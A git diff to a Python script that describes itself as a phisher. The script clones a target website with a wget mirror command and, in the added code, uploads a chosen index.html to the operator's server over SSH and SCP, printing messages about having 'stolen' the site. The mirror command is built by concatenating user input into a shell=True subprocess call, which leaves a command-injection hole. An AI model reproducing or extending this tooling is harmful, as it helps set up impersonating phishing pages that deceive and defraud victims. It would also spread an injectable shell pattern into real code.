@@ -7,6 +7,7 @@ import argparse
 import scp
 import paramiko
 import getpass
+from time import sleep
 from paramiko import SSHClient
 from scp import SCPClient
 from urllib.parse import urlparse
@@ -42,9 +43,9 @@ def clone(website):
     web = subprocess.Popen(["wget --mirror --convert-links --adjust-extension --page-requisites --no-parent " + website], shell=True)
     # web.kill()
     # if web == True:
-        # print("Successfully stole website!")
+    #     print("Successfully stole website!")
     # else:
-        # print("Ru roh raggy")
+    #     print("Ru roh raggy")
 
 def enable(website):
     print("Before starting our phisher we need your login info to upload to a server")
@@ -52,11 +53,21 @@ def enable(website):
     password = getpass.getpass("Enter password: ")
     port = input("Enter port: ")
 
+    index = input("Enter filepath to desired index.html file: ")
+
     print("Uploading stolen website to personal website...")
     ssh = SSHClient()
     ssh.load_system_host_keys()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect(website, port, user, password)
+
+    scp = SCPClient(ssh.get_transport())
+    scp.put(index)
+
+    sleep(3)
+
+    print("Website successfully uploaded, you may need to send it somewhere else in your home directory, however.")
+    return 0
 
 def website_test(website):
     print(website)
